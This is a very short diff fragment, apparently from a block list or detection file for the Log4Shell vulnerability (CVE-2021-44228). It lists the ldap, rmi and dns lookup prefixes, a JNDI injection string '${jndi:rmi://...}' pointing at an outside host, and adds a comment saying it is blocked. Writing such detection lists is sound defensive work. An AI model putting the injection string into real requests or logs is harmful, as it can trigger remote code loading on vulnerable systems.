@@ -1,2 +1,4 @@
 ldap://,rmi://,dns://CVE-2021-44228
 ${jndi:rmi://://saidLink.com}
+
+// blocked on bash.
